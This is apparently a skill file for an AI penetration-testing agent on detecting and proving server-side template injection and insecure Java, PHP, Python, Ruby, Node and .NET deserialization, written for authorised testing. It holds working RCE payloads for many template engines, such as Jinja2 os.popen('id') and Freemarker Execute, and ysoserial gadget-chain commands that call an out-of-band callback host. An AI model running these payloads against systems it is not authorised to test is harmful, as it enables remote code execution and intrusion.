---
name: web-ssti-deser
description: Use when input hits a template engine or a serialized object — per-engine SSTI detection and insecure-deserialization safe PoC. Classes ssti/deser.
---

# Server-side template injection & insecure deserialization

Both often reach RCE, so prove capability with the **least intrusive** payload (arithmetic eval for SSTI; an OOB ping for deser) and gate anything beyond a benign proof behind operator approval. Stay in scope.

Per candidate: `record kind=hypothesis ... class=ssti|deser outcome=testing`. **Test every reflected param against SSTI and every serialized blob against deser** — don't sample. A format match or partial eval you can't fully prove is `outcome=inconclusive` (surfaced by `recall gaps`), not a dropped lead.

## SSTI (class=ssti · WSTG-INPV-18 · CWE-1336 / CWE-94 · OWASP A03:2021)
### Detect with a differential, then fingerprint the engine
```bash
# does the app EVALUATE expressions? the braces are the tells:
curl -s "https://TARGET/p?name=\${7*7}"      # -> 49  => Freemarker / Spring-EL / JSP-EL / Thymeleaf / Mako
curl -s "https://TARGET/p?name={{7*7}}"      # -> 49  => Jinja2 / Twig / Nunjucks / AngularJS
curl -s "https://TARGET/p?name={{7*'7'}}"    # 7777777 => Jinja2 ; 49 => Twig   (the key differentiator)
curl -s "https://TARGET/p?name={7*7}"        # -> 49  => Smarty
curl -s "https://TARGET/p?name=<%= 7*7 %>"   # -> 49  => ERB (Ruby)
curl -s "https://TARGET/p?name=#{7*7}"       # -> 49  => Ruby / Slim / Pug (Node)
```
`49` (or `7777777`) reflected = code is evaluated, not just echoed. Reflection of the literal `{{7*7}}` = **not** SSTI (record `refuted` only if the literal is echoed unchanged; if you're unsure it reached the template, keep it `inconclusive`). Also try broken syntax (`${{<%[%'"}}%\`) to force an engine-revealing stack trace.

### Per-engine escalation (confirm, don't rampage)
- **Jinja2 (Python/Flask):** `{{ config }}` / `{{ ''.__class__.__mro__[1].__subclasses__() }}`; RCE via `{{ cycler.__init__.__globals__.os.popen('id').read() }}` or `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`.
- **Twig (PHP):** `{{ _self }}`; `{{ ['id']|filter('system') }}` (older) or `{{ ['id']|map('system')|join }}`.
- **Freemarker (Java):** `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Velocity (Java):** `#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")`.
- **Thymeleaf (Java/Spring):** `${T(java.lang.Runtime).getRuntime().exec('id')}` (expression preprocessing `__${...}__`).
- **ERB (Ruby):** `<%= system("id") %>` / `` <%= `id` %> ``.
- **Smarty (PHP):** `{system('id')}` / `{php}...{/php}` (older Smarty).
- **Mako (Python):** `${__import__('os').popen('id').read()}` / `<% import os %>${os.popen('id').read()}`.
- **Nunjucks / Pug / Handlebars (Node):** `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`.
Least-intrusive proof = `id`/`whoami` output or a `sleep`/OOB callback; do not run destructive commands.

## Insecure deserialization (class=deser · CWE-502 · OWASP A08:2021)
### Recognize the sink (check every serialized blob, cookie, and hidden field)
- **Java:** base64 blobs starting `rO0AB` (magic `ac ed 00 05`) or gzip'd `H4sI`; params/cookies named `viewstate`, `session`, `state`, `oam`; `readObject`, `XMLDecoder`, SnakeYAML, Hessian/Burlap, Kryo, JMS, RMI/JNDI lookups (LDAP/RMI).
- **PHP:** `unserialize()` on user input; strings like `O:8:"stdClass":...`; magic methods `__wakeup`/`__destruct`/`__toString` (POP chains); `phar://` metadata deserialization; framework cookies (Laravel/Symfony).
- **Python:** `pickle.loads`/`cPickle`, `yaml.load` (unsafe, not `safe_load`), `jsonpickle`, `dill`, `shelve`; base64 pickle blobs; `__reduce__`.
- **Ruby:** `Marshal.load`, unsafe YAML (`Psych.load`/`YAML.load`), Oj in compat mode.
- **Node:** `node-serialize` (`_$$ND_FUNC$$_`), `funcster`, `serialize-javascript`, `cryo`; prototype-pollution → gadget → RCE.
- **.NET:** `BinaryFormatter`, `LosFormatter`/ViewState (`__VIEWSTATE`, exploitable with a known/absent MAC key), `Json.NET TypeNameHandling`, `NetDataContractSerializer`, `SoapFormatter`, `ObjectStateFormatter`.

### Safe confirmation
```bash
# Java — cleanest dependency-free proof: URLDNS gadget triggers only a DNS lookup, needs NO target library:
java -jar ysoserial.jar URLDNS "http://OOB_ID.oast.pro" | base64 -w0
# a real chain when a vulnerable lib is present (still a benign OOB callback, never a reverse shell):
java -jar ysoserial.jar CommonsCollections5 'nslookup OOB_ID.oast.pro' | base64 -w0
# .NET — ysoserial.net (separate project): -g gadget -f formatter -c command
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "nslookup OOB_ID.oast.pro"
# PHP POP chains: phpggc <chain> system id     # Python: a benign __reduce__ that pings OOB
```
- Prove execution with a **DNS/HTTP callback** (OOB) or a timing sleep — the cleanest non-destructive proof for a blind sink. `URLDNS` is best for pure detection: a callback confirms the blob was deserialized even with no RCE gadget on the classpath.
- Detecting the format ≠ exploitable. A decode/format-match alone is a strong hypothesis, not a finding: record `outcome=inconclusive` and route via `recall gaps` (missing gadget, MAC-signed ViewState, `safe_load` in use). Do not silently drop it and do not over-claim a finding.

## Wire into the loop
```
record kind=hypothesis statement="name param is Jinja2 SSTI" target=e6 class=ssti approach="{{7*7}} and {{7*'7'}} differential" outcome=confirmed evidence=evidence/ssti.txt
record kind=finding title="SSTI (Jinja2) -> RCE via name param" severity=critical target=e6 class=ssti cwe=CWE-94 status=confirmed hypothesisId=y5 evidence=["evidence/ssti-id.txt"]
record kind=finding title="Insecure Java deserialization on /state cookie" severity=critical target=e9 class=deser cwe=CWE-502 status=confirmed hypothesisId=y7 evidence=["evidence/deser-oob.txt"]
```
Severity: confirmed RCE = critical; eval/read-only template context = high; format present but unproven = keep as `inconclusive` hypothesis (no finding yet).

## References
- OWASP WSTG — Testing for Server-side Template Injection — WSTG-INPV-18 — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- MITRE CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine — https://cwe.mitre.org/data/definitions/1336.html
- MITRE CWE-94: Improper Control of Generation of Code ('Code Injection') — https://cwe.mitre.org/data/definitions/94.html
- MITRE CWE-502: Deserialization of Untrusted Data — https://cwe.mitre.org/data/definitions/502.html
- OWASP Cheat Sheet — Deserialization — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- PortSwigger Web Security Academy — Server-side template injection — https://portswigger.net/web-security/server-side-template-injection
- PortSwigger Web Security Academy — Insecure deserialization — https://portswigger.net/web-security/deserialization
- ysoserial (Java gadget-chain generator; includes the dependency-free URLDNS gadget) — https://github.com/frohoff/ysoserial
